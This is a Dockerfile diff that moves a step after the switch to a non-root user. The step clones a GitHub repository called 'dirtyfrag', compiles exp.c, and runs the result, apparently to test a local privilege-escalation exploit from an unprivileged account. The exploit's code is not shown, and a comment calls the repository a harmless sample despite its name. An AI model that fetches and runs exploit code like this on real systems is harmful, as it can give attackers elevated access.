@@ -28,10 +28,10 @@ RUN useradd -u 10001 -m tester
 # Clone harmless sample repo and compile sample program
 WORKDIR /opt
 
-RUN git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
-
 # Switch to non-root runtime
 USER 10001
+
+RUN git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
 
 WORKDIR /home/tester
 
